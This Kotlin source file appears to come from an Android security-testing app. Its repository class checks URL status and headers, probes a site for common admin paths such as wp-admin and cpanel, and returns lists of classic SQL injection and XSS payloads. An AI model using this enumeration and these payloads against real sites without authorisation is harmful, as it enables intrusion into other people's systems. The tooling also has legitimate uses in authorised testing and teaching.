package com.laitoxx.security.data.repository

import com.laitoxx.security.data.model.ToolResult
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.URL
import javax.net.ssl.HttpsURLConnection

class WebSecurityRepository {

    suspend fun checkURL(url: String): Result<ToolResult> = withContext(Dispatchers.IO) {
        try {
            val urlObj = URL(if (!url.startsWith("http")) "https://$url" else url)
            val connection = urlObj.openConnection() as HttpsURLConnection
            connection.connectTimeout = 5000
            connection.readTimeout = 5000
            connection.requestMethod = "HEAD"

            val responseCode = connection.responseCode
            val isSecure = url.startsWith("https://")

            val info = buildString {
                appendLine("URL: $url")
                appendLine("Status Code: $responseCode")
                appendLine("Status: ${getStatusMessage(responseCode)}")
                appendLine("Secure (HTTPS): ${if (isSecure) "✓ Yes" else "✗ No"}")
                appendLine("Server: ${connection.getHeaderField("Server") ?: "Unknown"}")
                appendLine("Content-Type: ${connection.getHeaderField("Content-Type") ?: "Unknown"}")
            }

            connection.disconnect()

            Result.success(ToolResult(
                success = responseCode in 200..299,
                data = info
            ))
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun findAdminPages(baseUrl: String): Result<List<String>> = withContext(Dispatchers.IO) {
        try {
            val commonAdminPaths = listOf(
                "admin", "administrator", "admin.php", "admin.html",
                "login", "wp-admin", "admin/login", "adminpanel",
                "cpanel", "controlpanel", "admin/index", "admin/login.php",
                "admin/admin.php", "user/admin", "administrator/index",
                "moderator", "webadmin", "adminarea", "bb-admin"
            )

            val foundPages = mutableListOf<String>()
            val cleanUrl = baseUrl.removeSuffix("/")

            for (path in commonAdminPaths) {
                try {
                    val testUrl = "$cleanUrl/$path"
                    val url = URL(testUrl)
                    val connection = url.openConnection() as HttpsURLConnection
                    connection.connectTimeout = 3000
                    connection.readTimeout = 3000
                    connection.requestMethod = "HEAD"

                    val responseCode = connection.responseCode
                    if (responseCode in 200..399) {
                        foundPages.add("$path (${responseCode})")
                    }

                    connection.disconnect()
                } catch (e: Exception) {
                    continue
                }
            }

            Result.success(foundPages)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    private fun getStatusMessage(code: Int): String = when (code) {
        200 -> "OK"
        201 -> "Created"
        204 -> "No Content"
        301 -> "Moved Permanently"
        302 -> "Found"
        304 -> "Not Modified"
        400 -> "Bad Request"
        401 -> "Unauthorized"
        403 -> "Forbidden"
        404 -> "Not Found"
        500 -> "Internal Server Error"
        502 -> "Bad Gateway"
        503 -> "Service Unavailable"
        else -> "Unknown"
    }

    fun getSQLInjectionPayloads(): List<String> = listOf(
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "' AND 1=1--"
    )

    fun getXSSPayloads(): List<String> = listOf(
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>"
    )
}
